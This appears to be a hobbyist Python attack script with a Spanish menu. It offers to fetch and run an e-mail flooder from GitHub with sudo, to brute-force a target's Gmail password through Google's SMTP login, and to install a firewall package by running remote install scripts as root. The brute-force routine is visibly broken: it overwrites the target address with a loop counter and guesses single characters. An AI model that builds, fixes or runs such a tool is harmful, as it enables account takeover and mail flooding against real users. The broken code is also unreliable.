import random
import string 
import smtplib	
import os
import time
import socket
from timeit import default_timer as timer
import timeit
from ping3 import ping , verbose_ping

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
# <---<flooder>---> 
def flooder():
	print("1 --> Download")
	print("2 -->  execute")
	print("3 -->     Exit")
	flooder = input(">>")
	if flooder == "1":
		os.system("git clone https://github.com/Pulsar7/E-Mail-Flooder")
	if flooder == "2":
		os.system("mv E-Mail-Flooder */")
		os.system("sudo python3 email-flooder")
	if flooder == "3":
		os.system("clear")
		menu()
# <---<bruteforce>--->
def bruteforceall():
	gmail = input("Enter the target's email address: ")
	for gmail in range(20):
		time.sleep(0.5)
		characters = list(string.ascii_letters + string.digits + "!$%&'()*+,-./0123456789:;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\^_`abcdefghijklmnopqrstuvwxyz{|}~][")
		length = 1
		passwordd = []
		for i in range(length):
				passwordd.append(random.choice(characters))
		random.shuffle(passwordd)
		for password in passwordd:
			try:

				t = time.process_time()
				smtpserver.login(gmail, password)
				elapsed_time = time.process_time() - t


			except smtplib.SMTPAuthenticationError:
				print("[!] Password Incorrect: %s" % password)
				ping('smtp.gmail.com')
				print(t)
			if t < 0.453125:
				print("added")
def firewall():
	print("1 --> install")
	print("2 --> execute")
	print("3 --> exit   ")
	firewall = input(">>")
	if firewall == "1":
		os.system("sudo cd /usr/local/src/")
		os.system("sudo git clone https://github.com/netkiller/firewall.git")
		os.system("mv firewall */")
		os.system("sudo bash install.sh")
		os.system("sudo python3 setup.py install")
	if firewall == "2":
		os.system("firewall")
	if firewall == "3":
		os.system("clear")
		menu()
def menu():
	print("modos:")
	print("    all (pruba con todos los caracteres(se tarda mucho mas))")
	print("    mayus (prueba solo con caracteres en mayusculas)")
	print("    minus(prueba solo en minusculas)")
	print("    security(calcula la velocidad media de ataque ")
	option = input("opcion>>>")
	if option == "bruteforce":
		print("porfavor indique la opcion de [bruteforce]")
	if option == "firewall":
		firewall()
	if option == "bruteforce -all":
		bruteforceall()
	if option == "flooder":
		flooder()

menu()
